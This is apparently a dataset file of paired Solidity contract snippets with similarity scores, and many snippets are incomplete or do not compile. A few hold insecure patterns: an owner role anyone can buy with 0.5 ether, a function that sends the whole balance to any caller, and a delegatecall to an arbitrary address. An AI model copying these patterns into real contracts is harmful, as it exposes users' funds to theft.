        return true;

    }

    
    function name() public view returns (string memory) {
        return _name;
    }

    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    
    function _isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}"
"contract C {
    string public senderString;

    function toString(address x) returns (string) {
        bytes memory b = new bytes(20);
        for (uint i = 0; i < 20; i++)
            b[i] = byte(uint8(uint(x) / (2**(8*(19 - i)))));
        return string(b);
    }

    function test() {
        senderString = toString(msg.sender);
    }
}",0.5925809259896662,"contract Utils {

  function testrc(bytes32 hash, uint8 v, bytes32 r, bytes32 s) public pure returns(address) {

    return ecrecover(hash, v, r, s);

  }



  function hash(uint x, uint y, uint z, uint w) public pure returns(bytes32) {

    return sha3(x,y,z,w);

  }

}"
"contract SendAndTransferExample {

    constructor() public payable { }

    function SimpleSendToAccount() public returns(bool) {
       return msg.sender.send(10000000000000000000);
    }

    function SimpleTransferToAccount() public {
       msg.sender.transfer(10000000000000000000);
    }

    function() public payable { }
}",0.5740409572313193,"contract MyCompanyWallet is Ownable {

    address public Owner;

    

    function setup() public payable {

        if (msg.value >= 0.5 ether) {

            Owner = msg.sender;

        }

    }

    

    function withdraw() public {

        if (isOwner()) {

            msg.sender.transfer(address(this).balance);

        }

    }

    

    function() public payable { }

}"
"contract ModifierTest {

    address public owner;

    struct myStruct {
        uint256 fancyVar;
    }

    constructor() public {
        owner = msg.sender;
    }

    modifier myFancyModifier {
        uint16 a = 314;
        myStruct memory b;
        b.fancyVar = 159;
        _;
    }

    function myFunction() external myFancyModifier {
        uint16 c = a * 2;
        uint16 d = b.fancyVar * 3;
    }
}",0.595252464949755,"contract MockOracle is OracleInterface {



    uint256 public price_;

    address owner;

    

    

    modifier onlyOwner() {

        if (msg.sender != owner) {

            revert();

        }

         _;

    }

    

    constructor() public {

        owner = msg.sender;

    }



    function setPrice(uint256 price) public onlyOwner {

    

      price_ = price;



    }



    function price() public view returns (uint256){



      return price_;



    }



}"
"contract YourContract is Client {
    address public chronosAddress;
    address public admin;

    function YourContract() public {
        chronosAddress = address(0x4896FE22970B06b778592F9d56F7003799E7400f);
        admin = msg.sender;
    }




    function setCallrequest(uint256 blockNumber, uint256 gasAmount) public {
        _Chronos ChronosInstance = _Chronos(chronosAddress);
        uint256 costs = ChronosInstance.registerCall(address(this), blockNumber, gasAmount);
        require(address(this).balance >= costs);
        ChronosInstance.clientFunding.value(costs)(address(this));
    }


    function callBack() public {
        setCallrequest(block.number + 40, 200000); 

        admin.transfer(this.balance); 
    }



    function () public payable {}



}",0.5911591951694819,"contract AirDrop is Ownable {



  

  Token public tokenInstance;



  

  function AirDrop(address _tokenAddress){

    tokenInstance = Token(_tokenAddress);

  }



  

  function doAirDrop(address[] _address, uint256[] _amount, uint256 _ethAmount) onlyOwner public returns (bool) {

    uint256 count = _address.length;

    for (uint256 i = 0; i < count; i++)

    {

      

      tokenInstance.transfer(_address [i],_amount [i]);

      if((_address [i].balance == 0) && (this.balance >= _ethAmount))

      {

        require(_address [i].send(_ethAmount));

      }

    }

  }





  function transferEthToOnwer() onlyOwner public returns (bool) {

    require(owner.send(this.balance));

  }



  

  function() payable {



  }



  



  function kill() onlyOwner {

    selfdestruct(owner);

  }

}"
"contract Handcuffs {
    
    function set(address _left, address _right) onlydeployer onlyonce {
        left = _left;
        right = _right;
    }
    
}",0.5829109228843138,"contract oracleClient is ERC20Holder {

    

    address oracle;

    

    function setOracle(address a) public  onlyOwner {

        

        oracle = a;

    }

}"
"contract ChildInterface {
    function f1() {}
    function f2() {}
    function f3() {}
    function f4() {}
    function f5() {}
}",0.5650931020935425,"contract IPausable {

    
    function isPaused() constant returns (bool);


    
    function pause();


    
    function resume();
}"
"contract Main {
    ChildInterface ch;
    function Main(address child) {
        ch=ChildInterface(child);
    }
    function test() {
        ch.f1();
        ch.f2();
        ch.f3();
        ch.f4();
        ch.f5();
    }
}",0.523762012026671,"contract LOTInterface {

    function transfer(address _to, uint _value) public {}

    function balanceOf(address _owner) public view returns (uint) {}

}"
"contract BackendProxy {
  address private backendImplementation;
  address private owner;

  constructor (address _backendImplementation) public {
    backendImplementation = _backendImplementation;
    owner = msg.sender;
  }

  function () external payable {
    if (msg.data.length > 0) {
      address oldBackendImplementation = backendImplementation;
      address oldOwner = owner;

      bool status;
      bytes memory data;
      (status, data) = backendImplementation.delegatecall (msg.data);
      require (oldBackendImplementation == backendImplementation);
      require (oldOwner == owner);

      if (status) {
        assembly {
          return (add (data, 0x40), mload (data))
        }
      } else {
        assembly {
          revert (add (data, 0x40), mload (data))
        }
      }
    }
  }

  function setBackendImplementation (address _backendImplementation) public {
    require (msg.sender == owner);
    backendImplementation = _backendImplementation;
  }
}",0.5667411417522868,"contract Proxy {
    address private targetAddress;

    address private admin;
    constructor() public {
        targetAddress = 0xea265f4004D4536dE02b96E0556200c9Ef68374D;
        
        admin = msg.sender;
    }

    function setTargetAddress(address _address) public {
        require(msg.sender==admin , ""Admin only function"");
        require(_address != address(0));
        targetAddress = _address;
    }

    function getContAdr() public view returns (address) {
        require(msg.sender==admin , ""Admin only function"");
        return targetAddress;
        
    }
    function () external payable {
        address contractAddr = targetAddress;
        assembly {
            let ptr := mload(0x40)
            calldatacopy(ptr, 0, calldatasize)
            let result := delegatecall(gas, contractAddr, ptr, calldatasize, 0, 0)
            let size := returndatasize
            returndatacopy(ptr, 0, size)

            switch result
            case 0 { revert(ptr, size) }
            default { return(ptr, size) }
        }
    }
}"
"contract Example {
    bool _isActive = true;

    modifier checkActive() {
        require (_isActive);
        _;
    }

    function do1() checkActive public {
        
    }

    function do2() checkActive public {
        
    }

    function setActivity(bool isActive) public {
        
        _isActive = isActive;
    }
}",0.5638837370922508,"contract Freezable is HasOwner {
  bool public frozen = false;

  
  modifier requireNotFrozen() {
    require(!frozen);
    _;
  }

  
  function freeze() onlyOwner public {
    frozen = true;
  }

  
  function unfreeze() onlyOwner public {
    frozen = false;
  }
}"
"contract SomeContract {
    TestInterface public tI = TestInterface(address(0));

    function someFunc(string _someString) public returns (bool) {
        if (keccak256(_someString) == keccak256(""hello"")) {
            require(tI.someAction());
        }
    }
}",0.5816784254720134,"contract WhitelistInterface {

  function checkRole(address _operator, string memory _role) public view;

  function hasRole(address _operator, string memory _role) public view returns (bool);

}"
"contract Game {

  function recordHit(address scoreContract) public {
    ScoreInterface s = ScoreInterface(scoreContract);
    s.hit();
  }
}",0.5956807983205783,"contract TokenFactoryInterface {

    function create(string _name, string _symbol) public returns (FactoryTokenInterface);

}"
"contract KYCPurchase {
      uint public price = 2 ether;
      address owner;

      constructor() public{
      owner = msg.sender
}
      modifier _ownerOnly(){
      require(msg.sender == owner);
}
      struct Company {
          string registeredNumber;
          string companyName;
      }

      mapping (address => Company) companies;

      function buy(string registeredNumber, string companyName) public payable {
        require(msg.value == price);

        
        companies[msg.sender] = Company(registeredNumber, companyName);

      }

      function isKYCPaymentOK (address companyAddress) pure _ownerOnly returns (string, string) {
            require(companies[companyAddress].registeredNumber > 0);
            return (companies[companyAddress].registeredNumber, companies[companyAddress].companyName);

      }
    }",0.5817690044118614,"contract Bounty {

    uint public counter = 0;

    uint public currentNumber = 1;

    string internal base64this;

    mapping(address => bool) internal winners; 

    

    constructor(string memory _base64) public {

        base64this = _base64;

    }

    

    function claim(uint guessCurrentNumber, uint setNextNumber) public {

        require(counter < 10, ""All prizes collected"");

        require(winners[msg.sender] == false, ""Cannot participate twice. But feel free to sybil us"");

        require(currentNumber == guessCurrentNumber);

        currentNumber = setNextNumber;

        counter += 1;

        winners[msg.sender] = true;

    }

    

    function getPrize() public view returns (string memory){

        require(winners[msg.sender]);

        return base64this;

    }

    

}"
"contract OwnedToken {
    
    
    
    TokenCreator creator;
    ...

    function OwnedToken(bytes32 _name) public {
        
        
        
        
        creator = TokenCreator(msg.sender);
        ...
    }

}",0.5657705803805043,"contract TokenFactoryInterface {

    function create(string _name, string _symbol) public returns (FactoryTokenInterface);

}"
"contract Foo {
  function cut(bytes sha) constant returns (bytes32 half1, bytes32 half2) {
    assembly {
      half1 := mload(add(sha,0x20))
      half2 := mload(add(sha,0x40))
    }
  }
}",0.5396009588508595,"contract Registrar {
  function transfer(bytes32 _hash, address newOwner);
  function entries(bytes32 _hash) constant returns (uint, Deed, uint, uint, uint);
}"
"contract MaliciousContract {
    function foobar() {
        
        B(msg.sender).bar(255);
    }
}",0.5641614338776636,"contract test {
    
    function a() public
    {
        msg.sender.transfer(this.balance);    
    }
    
    
}"
"contract Batch is Ownable {

    using HitchensUnorderedKeySetLib for HitchensUnorderedKeySetLib.Set;
    HitchensUnorderedKeySetLib.Set batchIds;

    struct BatchStruct {
        
        uint batchCreationDate; 
        address batchOwner;
        string batchOrigin; 
        string productName; 
    }

    mapping(bytes32 => BatchStruct) public batches; 

    function genBatchId() internal view returns(bytes32) {
        return keccak256(abi.encodePacked(address(this), batchIds.count()));
    }

    function createBatch(address batchOwner, string memory batchOrigin, string memory productName) public onlyOwner returns(bytes32) {
        bytes32 id = genBatchId();
        batchIds.insert(id);
        BatchStruct storage b = batches[id];
        b.batchOwner = batchOwner;
        b.batchOrigin = batchOrigin;
        b.productName = productName;
        
    }

    

    function getBatch(bytes32 batchId) public view returns(uint, address, string memory, string memory) {
        require(batchIds.exists(batchId), ""Batch not found"");
        BatchStruct storage b = batches[batchId];
        return (b.batchCreationDate, b. batchOwner, b.batchOrigin, b.productName);
    }
}",0.5218872758864657,"contract RegistrarInterface {

    event OwnerChanged(bytes32 indexed label, address indexed oldOwner, address indexed newOwner);

    event DomainConfigured(bytes32 indexed label);

    event DomainUnlisted(bytes32 indexed label);

    event NewRegistration(bytes32 indexed label, string subdomain, address indexed owner, address indexed referrer, uint price);

    event RentPaid(bytes32 indexed label, string subdomain, uint amount, uint expirationDate);



    

    function query(bytes32 label, string calldata subdomain) external view returns (string memory domain, uint signupFee, uint rent, uint referralFeePPM);

    function register(bytes32 label, string calldata subdomain, address owner, address payable referrer, address resolver) external payable;



    function rentDue(bytes32 label, string calldata subdomain) external view returns (uint timestamp);

    function payRent(bytes32 label, string calldata subdomain) external payable;

}"
"contract Test {
    address[] public signups;
    uint createTime;

    constructor() public {
        createTime = now;
    }

    function signupsStopAfter10Min() public {
        require(now < createTime + 10 minutes);
        signups.push(msg.sender);
    }
}",0.5986801190582366,"contract Context {
    constructor () public { }

    function _msgSender() public view returns (address) {
        return msg.sender;
    }

    function _msgData() public view returns (bytes memory) {
        this;
        return msg.data;
    }
}"
"contract Object {

    struct ObjectStruct {
        bytes32 location;
        address owner; 
        bool isObject;
    }

    mapping(bytes32 => ObjectStruct) public objectStructs;
    bytes32[] public objectList;

    event LogNewObject(address sender, bytes32 uid, bytes32 location, address owner);
    event LogChangeObjectLocation(address sender, bytes32 uid, bytes32 newLocation);
    event LogChangeObjectOwner(address sender, bytes32 uid, address newOwner);

    function isObject(bytes32 _uid) public view returns(bool isIndeed) {
        return objectStructs[_uid].isObject;
    }

    function getObjectCount() public view returns(uint count) {
        return objectList.length;
    }

    function newObject(bytes32 _uid, bytes32 _location, address _owner) public returns(bool success) {
        require(!isObject(_uid));
        objectStructs[_uid].location = _location;
        objectStructs[_uid].owner = _owner;
        objectStructs[_uid].isObject = true;
        objectList.push(_uid);
        LogNewObject(msg.sender, _uid, _location, _owner);
        return true;
    }

    function changeObjectLocation(bytes32 _uid, bytes32 _newLocation) public returns(bool success) {
        require(isObject(_uid));
        objectStructs[_uid].location = _newLocation;
        LogChangeObjectLocation(msg.sender, _uid, _newLocation);
        return true;
    }

    function changeObjectOwner(bytes32 _uid, address _newOwner) public returns(bool success) {
        require(isObject(_uid));
        objectStructs[_uid].owner = _newOwner;
        LogChangeObjectOwner(msg.sender, _uid, _newOwner);
        return true;
    }

}",0.5720373554141386,"contract Oasisosc
 {
    
    event StorageEvent(address payable indexed from, bytes32 digestO, bytes32 digestQ); 
    event DestroyEvent(address payable indexed from); 
     
    struct Multihash
    {
      uint8 hashFunction;
      uint8 size;
      bytes32 digest;
    } 
     
    struct OSC
    {
     address payable owner_addr; 
     Multihash ontology;
     Multihash query;
     address previous_v; 
    }
    
    OSC private osc; 
    
    constructor(uint8 hashO, uint8 sizeO, bytes32 digestO,
                uint8 hashQ, uint8 sizeQ, bytes32 digestQ, address _prev) public 
    {
      osc= OSC(msg.sender, Multihash(hashO, sizeO, digestO), Multihash(hashQ, sizeQ, digestQ), _prev);
      emit StorageEvent(msg.sender, digestO, digestQ);
    }
    
    function getOntology() public view returns(uint8 hashO, uint8 sizeO, bytes32 digestO)
    {
      return (osc.ontology.hashFunction, osc.ontology.size, osc.ontology.digest);
    }
    
    function getSPARQLQuery() public view returns(uint8 hashQ, uint8 sizeQ, bytes32 digestQ)
    {
      return (osc.query.hashFunction, osc.query.size, osc.query.digest);
    }
    
    function getOwner() public view returns(address)
    {
      return osc.owner_addr;    
    }
    
    function getPreviousVersion() public view returns(address)
    {
      return osc.previous_v;   
    }
   
    modifier owner_allowed
    {
      require (msg.sender == osc.owner_addr, ""Only contract owner is allowed to call this function"");    
      _;
    }
    
    
    function destroy() public owner_allowed
    {
      emit DestroyEvent(msg.sender);    
      selfdestruct(msg.sender);
    }
}"
"contract ContractD {
    ContractE e = ContractE(<CONTRACT_E_ADDRESS>);

    function invokeContractE(uint256 _number_1, uint256 _number_2) public { 
        e.setN(_number_1, _number_2);
    } 
}",0.5017402218009631,"contract IConnector

{

    function getSellPrice() public view returns (uint);

    function transfer(address to, uint256 numberOfTokens, uint256 price) public;

}"
"contract CheckKey {

    modifier onlyIfKeyMatches(bytes32 hash, bytes32 key) {
        require(isKey(hash, key));
        _;
    }

    function isKey(bytes32 hash, bytes32 privateKey) public pure returns (bool success) {
        return keccak256(abi.encodePacked(privateKey)) == hash;
    }

    function protected(bytes32 hash, bytes32 privateKey) 
        public 
        onlyIfKeyMatches(hash, privateKey) 
    {
        
        
    }
}",0.5691036091666055,"contract ERC780 {

    function setClaim(address subject, bytes32 key, bytes32 value) public;

    function setSelfClaim(bytes32 key, bytes32 value) public;

    function getClaim(address issuer, address subject, bytes32 key) public view returns (bytes32);

    function removeClaim(address issuer, address subject, bytes32 key) public;

}"
"contract Foo {
  function returnContract() returns (SomeContract) {
    SomeContract sc = new SomeContract();
    return sc;
  }

  function returnAddress() returns (address) {
    SomeContract sc = new SomeContract();
    return address(sc);
  }
}",0.5864870376768696,"contract Token {
    function transferFrom(address from, address to, uint amount) returns (bool);
    function transfer(address to, uint amount) returns(bool);
    function balanceOf(address addr) constant returns(uint);
}"
"contract heheBox { 

    struct DataBox {
        mapping(address => string) Data_01;
        mapping(address => string) Data_02;
    }

    mapping(address => DataBox) DataBox_hehe;

    function save(string _InputData_01, string _InputData_02) public  {
        DataBox_hehe[msg.sender].Data_01[msg.sender] = _InputData_01;
        DataBox_hehe[msg.sender].Data_02[msg.sender] = _InputData_02;
    }   

    function display(address addressBox, address addressMap) constant public returns(string, string) {
        return(DataBox_hehe[addressBox].Data_01[addressMap], DataBox_hehe[addressBox].Data_02[addressMap]);
    }   

}",0.510738051268945,"contract ERC20MetaInfo {

  address public owner;

  mapping (address => mapping (string => string)) keyValues;



  

  constructor() public {

    owner = msg.sender;

  }



  

  function setKeyValue(ERC20 _token, string _key, string _value) public returns (bool) {

    

    

    

    require(bytes(keyValues[_token][_key]).length == 0 || owner == msg.sender || _token.owner() == msg.sender);

    keyValues[_token][_key] = _value;

    return true;

  }



  

  function getKeyValue(address _token, string _key) public view returns (string _value) {

    return keyValues[_token][_key];

  }

}"
"contract MyERC20Copy public { 
    MyERC20 m = MyERC20(contractaddress_for_MyERC20);

    function MyERC20Copy() { 
    
    } 

    function getERC20Balance(address target) public {
        unit balance = m.balanceOf[target]; 
    }
}",0.5957458097622589,"contract ERC20 {
  function balanceOf(address _owner) public constant returns (uint balance);
  function transfer(address _to, uint _value) public returns (bool success);
}"
"contract newInstance {

  struct someNewInstance {
    address usersAddress;
    address instanceAddress;
    string nameForTheInstance;
    bool instanceExists
  }

  mapping(address => mapping(bytes32 => someInstance)) public contractInstances;
  someInstance[] public listOfContracts;
  uint public instancesLength; 


  function createNewInstance(string memory _name) public returns(address) {
    bytes32 _id = keccak256(abi.encodePacked(msg.sender, _name));

    require(contractInstances[msg.sender][_id].instanceExists == false, ""There is already an Identity with this name""); 

    theContractToBeInstanced newInstance = new theContractToBeInstanced(msg.sender);
    address instanceAddress = address(newInstance);

    someInstance memory newInstanceStruct = someInstance(msg.sender, deployedAddress, _name, true);
    listOfContracts.push(newInstanceStruct);

    contractInstances[msg.sender][_id] = newInstanceStruct;
    instancesLength++;

    return deployedAddress;
  }

}",0.5498433209908529,"contract Registry {
    struct ContractVersion {
        string name;
        address contractAddress;
    }

    modifier onlyOwner {
        require(
            msg.sender == owner,
            ""Only the contract owner is allowed to use this function.""
        );
        _;
    }

    address owner;

    ContractVersion[] versions;

    constructor() public {
        owner = msg.sender;
    }

    function addVersion(string calldata versionName, address contractAddress)
        external
        onlyOwner
    {
        ContractVersion memory newVersion = ContractVersion(
            versionName,
            contractAddress
        );
        versions.push(newVersion);
    }

    function getNumberOfVersions() public view returns (uint size) {
        return versions.length;
    }

    function getVersion(uint i)
        public
        view
        returns (string memory versionName, address contractAddress)
    {
        require(i >= 0 && i < versions.length, ""Index is out of bounds"");
        ContractVersion memory version = versions[i];
        return (version.name, version.contractAddress);
    }

}"
"contract TheContract_A {
    address public mateAddress = OxB

    function funding(address from) payable public {
        if (from == mateAddress) {
            
        }
    }

    function () checkStatus {
        if (someCondition) {
            TheContract_B instanceOfB = TheContract_B(mateAddres);
            instanceOfB.funding.value(address(this).balance)(address(this));
        }
    }
}",0.5754625349437371,"contract ERC20Interface {

    function balanceOf(address from) public view returns (uint256);

    function transferFrom(address from, address to, uint tokens) public returns (bool);

    function allowance(address owner, address spender) public view returns (uint256);

}"
"contract TheContract_B {
    address public mateAddress = OxA

    function funding(address from) payable public {
        if (from == mateAddress) {
            
        }
    }

    function () checkStatus {
        if (someCondition) {
            TheContract_A instanceOfA = TheContract_A(mateAddres);
            instanceOfA.funding.value(address(this).balance)(address(this));
        }
    }
}",0.5754625349437371,"contract ERC20Interface {

    function balanceOf(address from) public view returns (uint256);

    function transferFrom(address from, address to, uint tokens) public returns (bool);

    function allowance(address owner, address spender) public view returns (uint256);

}"
"contract ABCToken {
    function sell(uint abcAmount) public {
        require(token.transferFrom(msg.sender, address(this), abcAmount)); 
        uint ethAmount = myFunc(abcAmount);
        msg.sender.transfer(ethAmount);
    }
}",0.5683052922695392,"contract CappedToken is MintableToken {



  

  function mint(

    address _to,

    uint256 _amount

  )

    public

    returns (bool)

  {

    require(totalSupply.add(_amount) <= cap);



    return super.mint(_to, _amount);

  }



}"
"contract FIFO {

    uint[] public fifoQueue;
    uint public cursorPosition;

    function queueDepth()
        public
        constant
        returns(uint queueDepth)
    {
        return fifoQueue.length - cursorPosition;
    }

    function push(uint requestData) 
        public
        returns(uint jobNumber)
    {
        if(fifoQueue.length + 1 < fifoQueue.length) throw; 
        return fifoQueue.push(requestData) - 1;
    }

    function pop() 
        public
        returns(uint, uint)
    {
        if(fifoQueue.length==0) throw;
        if(fifoQueue.length - 1 < cursorPosition) throw;
        cursorPosition += 1;
        return (cursorPosition -1, fifoQueue[cursorPosition -1]);
    }
}",0.5629132480053486,"contract PricingStrategy {



  address public tier;



  

  function isPricingStrategy() public constant returns (bool) {

    return true;

  }



  

  function isSane(address crowdsale) public constant returns (bool) {

    return true;

  }



  

  function isPresalePurchase(address purchaser) public constant returns (bool) {

    return false;

  }



  

  function updateRate(uint newOneTokenInWei) public;



  

  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);

}"
"contract FifoClient {

    FIFO public jobQueue;

    event LogPush(address sender, uint jobNumber, uint jobValue);
    event LogPop (address sender, uint jobNumber, uint jobValue);

    function FifoClient() {
        
        jobQueue = new FIFO();
    } 

    function push(uint jobValue)
        public
        returns(uint jobNumber)
    {
        uint jobNum = jobQueue.push(jobValue);
        LogPush(msg.sender, jobNum, jobValue);
        return jobNum;
    }

    function pop() 
        public
        returns(uint, uint)
    {
        uint jobNum;
        uint jobVal;
        (jobNum, jobVal) = jobQueue.pop();
        LogPop(msg.sender, jobNum, jobVal);
        return(jobNum, jobVal);
    }

}",0.5497771766805811,"contract BasicToken is ERC20Basic {
  using SafeMath for uint;

  mapping(address => uint) balances;

  uint totalSupply_;

  
  function totalSupply() public view returns (uint) {
    return totalSupply_;
  }

  
  function transfer(address _to, uint _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) public view returns (uint) {
    return balances[_owner];
  }

}"
"contract C is A {
   function C(uint size) 
     A(getInitialArray(size), 0) { 
   }
   function getInitialArray(uint size) constant returns (address[] initial) {
       initial = new address[](size);
       initial[0] = 0x1234567890123456789012345678901234567890;
   }
}",0.5444556020108753,"contract Common {
    
    function Common() internal {

    }

    function getIndexOfTarget(address[] list, address addr) internal pure returns (int) {
        for (uint i = 0; i < list.length; i++) {
            if (list[i] == addr) {
                return int(i);
            }
        }
        return -1;
    }
}"
"contract A {
    ERC20 token;
    function approveAndCall(B recipient, uint amount) public {
        
        require(token.approve(address(recipient), amount), ""Approve has failed"");

        
        require(recipient.processPayment(amount), ""Payment failed"");
    }
}",0.5911018505673263,"contract InternalTxsTest {
    function batch(uint256[] amounts, address[] recipients)
    public
    payable
    {
        require(amounts.length == recipients.length);

        for (uint8 i = 0; i < amounts.length; i++) {
            recipients[i].transfer(amounts[i]);
        }
    }
}"
"contract B is Test {
  function testTimestamp () {
    A a = new A();
    uint timestamp = a.createdTimestamp();
    
  }
}",0.588317678101183,"contract TimeMachineP {

  

  

  function getTimestamp_() internal view returns(uint) {

    return block.timestamp;

  }

}"
"contract d {
    struct Img {
        uint IDNumber;
        string color;
        address ownerAddress;
    }

    Img[] public imgsBoughtArray;

    function getBoughtImages() public returns (uint256[] memory imgsIDs, string[] memory imgsColors, address[] memory ownerIds) {
        uint[] memory boughtImgsIdsArray = new uint[](10);
        string[] memory imgsColorsArray = new string[](10);
        address[] memory ownersAddressesArray =  new address[](10);

        for (uint i = 0; i < 10; i++) {
            boughtImgsIdsArray[i] = (imgsBoughtArray[i].IDNumber);
            imgsColorsArray[i] = (imgsBoughtArray[i].color);
            ownersAddressesArray[i] = (imgsBoughtArray[i].ownerAddress);
        }
        return (boughtImgsIdsArray, imgsColorsArray, ownersAddressesArray);
    }
}",0.5400516986429968,"contract BatchBalanceInfo {

    struct BalanceInfo {

        uint256 balance;

        address owner;

    }

    function getBalance(address tokenAddress, address owner)

        public

        view

        returns (BalanceInfo memory balanceInfo)

    {

        balanceInfo.balance = IERC20Token(tokenAddress).balanceOf(owner);

        balanceInfo.owner = owner;

        return balanceInfo;

    }

    function getBalanceInfos(address tokenAddress, address[] memory owners)

        public

        view

        returns (BalanceInfo[] memory)

    {

        uint256 ownersLength = owners.length;

        BalanceInfo[] memory balanceInfos = new BalanceInfo[](ownersLength);

        for (uint256 i = 0; i != ownersLength; i++) {

            balanceInfos[i] = getBalance(tokenAddress, owners[i]);

        }

        return balanceInfos;

    }

}"
"contract MappingLoop {

constructor() public {
    structs[0][0].addr = msg.sender;
    structs[0][0].amount = 10;
    structs[0][1].addr = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c;
    structs[0][1].amount = 20;
    totalStructs[0] = 1; 
}


struct Struct {
    address addr;
    uint256 amount;
}
mapping (uint256 => mapping (uint256 => Struct)) internal structs;
mapping (uint256 => uint256) public totalStructs;


function simpleLoopFor (uint256 id) public returns(uint256) {
    require (totalStructs[id] > 0);
    uint256 totalAmount;
    for(uint8 i=0; i<= totalStructs[id]; i++){
        address addr   = structs[id][i].addr;
        uint256 amount = structs[id][i].amount;
        log0(bytes32(uint256(addr)));
        totalAmount = totalAmount + amount;
    }
    return totalAmount;
}
}",0.5677330416986633,"contract BasicToken is ERC20 {

  using SafeMath for uint256;

  

  mapping(address => uint256) balances;

  mapping (address => mapping (address => uint256)) internal allowed;



  uint256 totalSupply_;



  

  function totalSupply() public view returns (uint256) {

    return totalSupply_;

  }



  

  function balanceOf(address _owner) public view returns (uint256) {

    return balances[_owner];

  }

  

  

  function approve(address _spender, uint256 _value) public returns (bool) {

    allowed[msg.sender][_spender] = _value;

    emit Approval(msg.sender, _spender, _value);

    return true;

  }



  

  function allowance(

    address _owner,

    address _spender

   )

    public

    view

    returns (uint256)

  {

    return allowed[_owner][_spender];

  }

}"
"contract Mark { 
    function Deposit() payable {}
    function call(address a) {
        a.delegatecall(bytes4(sha3(""innocence()""))); 
    }
}",0.5937529456922077,"contract WETHFace {

    function deposit() external payable;

    function withdraw(uint wad) external;

}"
"contract Timestamping {
    mapping(string => uint256) timestamps;

    function setTimestamp(string hash) {
        
        require(timestamps[hash] == 0);
        timestamps[hash] = now;
    }
}",0.5131815428367416,"contract DateTimeAPI {
        
    function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour) constant returns (uint timestamp);

}"
"contract InvalidJump {
    uint[5] data;

    function invalidJump1() {
       uint i = 6000;
       data[i] = 1;
    }
}",0.5499461778768473,"contract ERC20 is IERC20 {

  

  function _mint(address account, uint256 value) internal;

}"
"contract SimpleAuction {
    event HighestBidIncreased(address bidder, uint amount); 

    function bid() payable {
        
        HighestBidIncreased(msg.sender, msg.value); 
    }
}",0.5831288682378681,"contract ProxyTest {



    event ETHSent(uint amt);



    function sendETH() public payable {

        address(msg.sender).transfer(msg.value);

        emit ETHSent(msg.value);

    }



}"
"contract Numbers {
    int[] public numbers;

    function Numbers() public {
        numbers.push(20);
        numbers.push(32);

        int[] myArray = numbers;
    }
}",0.5844455063575162,"contract addition {
    address reservedSlot; 
    uint256 public myNumber;
    
    function add() public {
        myNumber = myNumber + 1;
    }
}"
"contract myContract {

    struct myStruct{
        bytes32 name;
        bool active;
        uint[] changes;
    }

    myStruct[2] myStr;
    uint[] steps;

    event activatedEvent(uint time);

    function myContract() {
        myStr[0] = myStruct('foo', true, steps);
        myStr[1] = myStruct('bar', false, steps);
    }

    function activate(){
        myStruct ms = myStr[0]; 
        ms.changes.push(now);
        activatedEvent(now);
    }
}",0.5012733997491795,"contract AOQUtil {

    function getLevel(uint value) public view returns (uint);

    function getStaticCoefficient(uint level) public pure returns (uint);

    function getRecommendCoefficient(uint times) public pure returns (uint);

    function compareStr(string memory _str, string memory str) public pure returns (bool);

}"
"contract functionChain is usingOraclize {
    string public globalKey;
    mapping (bytes32 => bool) validIds;

    event LogResult(string result);
    event LogNewOraclizeQuery(string description);
    event LogFundsReceived(address sender, uint amount);

    constructor() public payable {
        OAR = OraclizeAddrResolverI(your oraclize address);
    }

    function() payable {
        LogFundsReceived(msg.sender, msg.value);
    }

    function __callback(bytes32 myid, string result) public {
        require(validIds[myid]);
        require(msg.sender == oraclize_cbAddress());
        globalKey = result;
        LogResult(result);
        delete validIds[myid];
    }

    function setData() public payable {
        if (oraclize_getPrice(""URL"") > this.balance) {
            LogNewOraclizeQuery(""Oraclize query was NOT sent"");
        }
        else {
            LogNewOraclizeQuery(""Oraclize query was sent"");
            bytes32 queryId = oraclize_query(""URL"", ""json(http:
            validIds[queryId] = true;
        }
    }
}",0.5623415891824929,"contract SAFETYToken is StandardToken {

  using SafeMath for uint256;

  

  string constant public name = ""Super AI Feasibility Technology"";

  string constant public symbol = ""SAFETY"";

  uint8 constant public decimals = 18;

  uint public totalSupply = 100*10**26;



  event PaymentReceived(address _from, uint256 _amount);



  constructor(address _wallet) public {

    balances[_wallet] = totalSupply;

    emit Transfer(address(0), _wallet, totalSupply);

  }



  function burn(uint256 _value) public returns (bool) 

  {

    require(balances[msg.sender] >= _value);

    balances[msg.sender] = balances[msg.sender].sub(_value);

    totalSupply = totalSupply.sub(_value);

    emit Burn(msg.sender, _value);

    return true;

  }

  

  function withdrawEther(uint256 _amount) public onlyOwner {

    owner.transfer(_amount);

  }



  function () external payable {

    emit PaymentReceived(msg.sender, msg.value);

  }

}"
"contract Callee {

  function doSomething() public returns(uint responseCode) {
    if(something()) return 1;
    if(somethingElse()) return 2;
    if(theOtherThing()) return 3;
    return 4;
  }
}",0.5816245931736309,"contract PausedCAD is PausedToken {

    function name() public pure returns (string) {

        return ""TrueCAD"";

    }



    function symbol() public pure returns (string) {

        return ""TCAD"";

    }

}"
"contract ItemListCallerContract {

     ItemListContract itemListContract;

     function ItemListCallerContract() {
         itemListContract = ItemListContract(0x16c5d0c8fccaf7e5824f5ae25c1662877cec6452);
     }

     function getItemCount() constant returns(uint count) {
         return itemListContract.countItemList();
     }
}",0.5220023279688372,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract KeccakCompare {
    struct Example {
        uint256 age;
        bytes32 name;
    }

    Example[] public examples;

    function pushExample(uint256 _age, bytes32 _name) external {
        examples.push(Example({
            age: _age,
            name: _name
        }));
    }

    function equals(uint256 _firstIndex, uint256 _secondIndex) external view returns (bool) {
        return equals(examples[_firstIndex], examples[_secondIndex]);
    }

    function equals(Example storage _first, Example storage _second) internal view returns (bool) {
        
        return(keccak256(abi.encodePacked(_first.age, _first.name)) == keccak256(abi.encodePacked(_second.age, _second.name)));
    }
